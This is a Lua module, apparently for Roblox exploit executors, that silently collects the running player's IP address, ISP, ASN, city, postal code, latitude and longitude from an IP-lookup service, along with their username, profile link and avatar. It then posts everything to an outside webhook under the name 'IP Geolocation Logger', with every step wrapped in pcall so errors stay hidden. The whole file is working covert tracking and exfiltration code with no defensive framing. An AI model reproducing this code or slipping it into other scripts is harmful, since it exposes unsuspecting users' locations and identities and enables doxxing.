return function(scriptName)
    local httpService = game:GetService("HttpService")
    local player = game:GetService("Players").LocalPlayer

    local toURL = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
    local successAvatar, avatarData = pcall(function()
        return httpService:JSONDecode(game:HttpGet(toURL)).data[1].imageUrl
    end)

    local successIP, ipData = pcall(function()
        return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
    end)

    ipData = successIP and ipData or {}

    local function createField(name, key)
        local value
        if key == "executed_script" then
            value = scriptName or "Not Found"
        else
            value = ipData[key] and tostring(ipData[key]) or "Not Found"
        end
        return {
            name = name,
            value = value
        }
    end

    pcall(function()
        (request or http_request or http and http.request)({
            Url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r",
            Method = "POST",
            Body = httpService:JSONEncode({
                embeds = {
                    {
                        color = 1733608,
                        fields = {
                            createField("IP Address", "ip"),
                            createField("Network Range", "network"),
                            createField("ASN (Autonomous System Number)", "asn"),
                            createField("ISP (Internet Service Provider)", "org"),
                            createField("Country", "country_name"),
                            createField("Region/Province", "region"),
                            createField("City", "city"),
                            createField("Postal Code", "postal"),
                            createField("Latitude", "latitude"),
                            createField("Longitude", "longitude"),
                            createField("Timezone", "timezone"),
                            createField("Executed Script", "executed_script")
                        }
                    },
                    {
                        title = "View " .. player.Name .. "'s full profile",
                        url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
                        color = 1733608,
                        image = {
                            url = successAvatar and avatarData or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
                        }
                    }
                },
                username = "IP Geolocation Logger",
                avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
            }),
            Headers = {
                ["content-type"] = "application/json"
            }
        })
    end)
end